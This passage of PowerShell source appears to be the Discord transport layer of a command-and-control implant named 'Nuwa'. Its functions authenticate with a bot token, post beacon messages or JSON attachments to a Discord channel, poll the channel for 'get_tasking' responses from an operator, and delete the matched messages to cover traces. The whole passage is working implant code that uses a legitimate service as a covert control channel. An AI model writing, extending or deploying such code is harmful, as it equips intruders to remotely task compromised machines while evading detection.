    return ConvertFrom-NuwaDiscordJsonObject -Value $content
}

function Send-NuwaDiscordApiAttachment {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Content
    )

    $tempPath = [System.IO.Path]::GetTempFileName()
    try {
        try {
            Add-Type -AssemblyName 'System.Net.Http' -ErrorAction Stop | Out-Null
        } catch {
        }
        [System.IO.File]::WriteAllText($tempPath, $Content, [System.Text.UTF8Encoding]::new($false))

        $handler = [System.Net.Http.HttpClientHandler]::new()
        Set-NuwaDiscordAttachmentProxy -Handler $handler

        $client = [System.Net.Http.HttpClient]::new($handler)
        try {
            $client.DefaultRequestHeaders.Authorization = [System.Net.Http.Headers.AuthenticationHeaderValue]::new(
                'Bot',
                [string]$script:NuwaConfig.DiscordToken
            )
            $client.DefaultRequestHeaders.UserAgent.ParseAdd((Get-NuwaDiscordUserAgent))

            $multipart = [System.Net.Http.MultipartFormDataContent]::new()
            $payloadJson = [System.Net.Http.StringContent]::new(
                (@{ content = '' } | ConvertTo-Json -Compress),
                [System.Text.Encoding]::UTF8,
                'application/json'
            )
            $multipart.Add($payloadJson, 'payload_json')

            $fileBytes = [System.IO.File]::ReadAllBytes($tempPath)
            $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
            $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/json')
            $multipart.Add($fileContent, 'files[0]', 'status-server')

            for ($attempt = 0; $attempt -lt 5; $attempt += 1) {
                $response = $client.PostAsync((Get-NuwaDiscordChannelUri), $multipart).GetAwaiter().GetResult()
                try {
                    $content = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()
                    $delayMilliseconds = Get-NuwaDiscordRateLimitDelayMilliseconds `
                        -ResponseContent $content `
                        -StatusCode ([int]$response.StatusCode)
                    if ($delayMilliseconds -ge 0 -and ($attempt + 1) -lt 5) {
                        Start-Sleep -Milliseconds $delayMilliseconds
                        continue
                    }

                    $response.EnsureSuccessStatusCode() | Out-Null
                    return ConvertFrom-NuwaDiscordJsonObject -Value $content
                } finally {
                    $response.Dispose()
                }
            }

            throw 'Discord attachment request exceeded retry attempts'
        } finally {
            $client.Dispose()
            $handler.Dispose()
        }
    } finally {
        if (Test-Path -LiteralPath $tempPath) {
            Remove-Item -LiteralPath $tempPath -Force
        }
    }
}

function Invoke-NuwaDiscordRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [AllowEmptyString()]
        [string]$TransportBody = '',

        [Parameter(Mandatory = $true)]
        [string]$WireBody,

        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $false)]
        [string]$ExpectedAction = ''
    )

    if ([string]::IsNullOrWhiteSpace($TransportBody)) {
        $TransportBody = $WireBody
    }
    $wrapper = ConvertTo-NuwaDiscordMessageWrapper -Message $TransportBody -SenderId $Uuid -ToServer $true
    $expectedRequest = ConvertFrom-NuwaDiscordWireBody -WireBody $WireBody -Uuid $Uuid -Action $ExpectedAction -Direction 'outbound'
    $requestStartedAt = [DateTimeOffset]::UtcNow
    $pendingTaskingMinimumTimestamp = $requestStartedAt
    if ($ExpectedAction -eq 'get_tasking') {
        if ($script:NuwaDiscordLastTaskingRequestStartedAt) {
            try {
                $pendingTaskingMinimumTimestamp = [DateTimeOffset]$script:NuwaDiscordLastTaskingRequestStartedAt
            } catch {
                $pendingTaskingMinimumTimestamp = $requestStartedAt
            }
        }
        $script:NuwaDiscordLastTaskingRequestStartedAt = $requestStartedAt
    }
    $requestMessage = if ($wrapper.Length -gt 1900) {
        Send-NuwaDiscordApiAttachment -Content $wrapper
    } else {
        Send-NuwaDiscordApiJson -Content $wrapper
    }
    $afterMessageId = if ($requestMessage -and $requestMessage.PSObject.Properties.Match('id').Count -gt 0) {
        [string]$requestMessage.id
    } elseif ($requestMessage -is [hashtable] -and $requestMessage.ContainsKey('id')) {
        [string]$requestMessage['id']
    } else {
        ''
    }
    Write-NuwaDebug ("Discord request action {0} after_message_id={1}" -f $ExpectedAction, $afterMessageId)
    $emptyTaskingMatch = $null

    for ($attempt = 0; $attempt -lt [int]$script:NuwaConfig.MessageChecks; $attempt += 1) {
        $messages = @(Get-NuwaDiscordMessages -AfterMessageId $afterMessageId)
        Write-NuwaDebug (
            "Discord poll action={0} attempt={1}/{2} after_message_id={3} message_count={4}" -f
            $ExpectedAction,
            ($attempt + 1),
            [int]$script:NuwaConfig.MessageChecks,
            $afterMessageId,
            $messages.Count
        )
        $alternateClientIds = @()
        if (
            -not [string]::IsNullOrWhiteSpace([string]$script:NuwaConfig.PayloadUUID) -and
            [string]$script:NuwaConfig.PayloadUUID -ne $Uuid
        ) {
            $alternateClientIds += [string]$script:NuwaConfig.PayloadUUID
        }
        $findParameters = @{
            Messages = $messages
            ExpectedClientId = $Uuid
            AlternateClientIds = $alternateClientIds
            ExpectedAction = $ExpectedAction
            ExpectedUuid = $Uuid
            ExpectedRequest = $expectedRequest
        }
        if ([string]::IsNullOrWhiteSpace($afterMessageId)) {
            $findParameters.MinimumTimestamp = $requestStartedAt
        }
        $matched = Find-NuwaDiscordInboundMessage @findParameters
        if (
            -not [string]::IsNullOrWhiteSpace($afterMessageId) -and
            (
                $null -eq $matched -or
                (
                    $ExpectedAction -eq 'get_tasking' -and
                    -not (Test-NuwaDiscordMessageHasTasks -Message $matched -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid)
                )
            )
        ) {
            $pendingMinimumTimestamp = $requestStartedAt
            if ($ExpectedAction -eq 'get_tasking') {
                # Tasking can arrive between polling cycles, so the fallback must
                # scan back to the previous poll boundary without replaying older
                # leftover tasking from the channel history.
                $pendingMinimumTimestamp = $pendingTaskingMinimumTimestamp
            }
            $pendingMessages = @(Get-NuwaDiscordMessages)
            Write-NuwaDebug (
                "Discord fallback action={0} attempt={1}/{2} minimum_timestamp={3:o} message_count={4}" -f
                $ExpectedAction,
                ($attempt + 1),
                [int]$script:NuwaConfig.MessageChecks,
                $pendingMinimumTimestamp,
                $pendingMessages.Count
            )
            $pendingMatch = Find-NuwaDiscordInboundMessage `
                -Messages $pendingMessages `
                -ExpectedClientId $Uuid `
                -AlternateClientIds $alternateClientIds `
                -ExpectedAction $ExpectedAction `
                -ExpectedUuid $Uuid `
                -MinimumTimestamp $pendingMinimumTimestamp `
                -ExpectedRequest $expectedRequest
            if (
                $null -ne $pendingMatch -and
                (
                    $ExpectedAction -ne 'get_tasking' -or
                    (Test-NuwaDiscordMessageHasTasks -Message $pendingMatch -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid)
                )
            ) {
                $messages = $pendingMessages
                $matched = $pendingMatch
            }
        }
        if ($null -ne $matched) {
            $matchedHasTasks = $true
            if ($ExpectedAction -eq 'get_tasking') {
                $matchedHasTasks = Test-NuwaDiscordMessageHasTasks -Message $matched -ExpectedAction $ExpectedAction -ExpectedUuid $Uuid
            }
            $matchedClientId = if ($matched.PSObject.Properties.Match('client_id').Count -gt 0) {
                [string]$matched.client_id
            } elseif ($matched.PSObject.Properties.Match('sender_id').Count -gt 0) {
                [string]$matched.sender_id
            } else {
                ''
            }
            $matchedMessageId = if ($matched.PSObject.Properties.Match('_discord_message_id').Count -gt 0) {
                [string]$matched._discord_message_id
            } else {
                ''
            }
            Write-NuwaDebug (
                "Discord matched action={0} attempt={1}/{2} message_id={3} target_client_id={4} has_tasks={5}" -f
                $ExpectedAction,
                ($attempt + 1),
                [int]$script:NuwaConfig.MessageChecks,
                $matchedMessageId,
                $matchedClientId,
                $matchedHasTasks
            )
            if (-not $script:NuwaDiscordProcessedMessageIds) {
                $script:NuwaDiscordProcessedMessageIds = @()
            }
            if (
                $matched.PSObject.Properties.Match('_discord_message_id').Count -gt 0 -and
                -not [string]::IsNullOrWhiteSpace([string]$matched._discord_message_id)
            ) {
                $script:NuwaDiscordProcessedMessageIds += [string]$matched._discord_message_id
            }
            foreach ($message in $messages) {
                $candidate = ConvertFrom-NuwaDiscordMessage -Message $message
                if (
                    [string]$message.id -and
                    $null -ne $candidate -and
                    [string]$candidate.message -eq [string]$matched.message -and
                    [string]$candidate.sender_id -eq [string]$matched.sender_id
                ) {
                    try {
                        Write-NuwaDebug ("Discord deleting matched message_id={0}" -f ([string]$message.id))
                        Remove-NuwaDiscordMessage -MessageId ([string]$message.id)
                    } catch {
                        Write-NuwaDebug ("Discord delete failed for message_id={0}: {1}" -f ([string]$message.id), $_.Exception.Message)
                    }
                    break
                }
            }
            if ($ExpectedAction -eq 'get_tasking' -and -not $matchedHasTasks) {
                $emptyTaskingMatch = $matched
                Write-NuwaDebug (
                    "Discord matched empty get_tasking action on attempt={0}/{1}" -f
                    ($attempt + 1),
                    [int]$script:NuwaConfig.MessageChecks
                )
                if ($attempt + 1 -lt [int]$script:NuwaConfig.MessageChecks) {
                    Start-Sleep -Seconds ([int]$script:NuwaConfig.TimeBetweenChecks)
                    continue
                }
            }
            if (
                $matched.PSObject.Properties.Match('_nuwa_wire_body').Count -gt 0 -and
                -not [string]::IsNullOrWhiteSpace([string]$matched._nuwa_wire_body)
            ) {
                return [string]$matched._nuwa_wire_body
            }
            return [string]$matched.message
        }
        if ($attempt + 1 -lt [int]$script:NuwaConfig.MessageChecks) {
            Start-Sleep -Seconds ([int]$script:NuwaConfig.TimeBetweenChecks)
        }
    }

    if ($null -ne $emptyTaskingMatch) {
        if (
            $emptyTaskingMatch.PSObject.Properties.Match('_nuwa_wire_body').Count -gt 0 -and
            -not [string]::IsNullOrWhiteSpace([string]$emptyTaskingMatch._nuwa_wire_body)
        ) {
            return [string]$emptyTaskingMatch._nuwa_wire_body
        }
        return [string]$emptyTaskingMatch.message
    }

    return $null
}

function Invoke-NuwaTransport {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Uuid,

        [Parameter(Mandatory = $true)]
        [string]$Action,

        [Parameter(Mandatory = $true)]
        [string]$WireBody
    )

    Write-NuwaDebug ("Discord transport action {0} for {1}" -f $Action, $Uuid)
    $body = New-NuwaTransportRequestBody -Uuid $Uuid -WireBody $WireBody
    return Invoke-NuwaDiscordRequest `
        -TransportBody $body `
        -WireBody $WireBody `
        -Uuid $Uuid `
        -ExpectedAction $Action
}
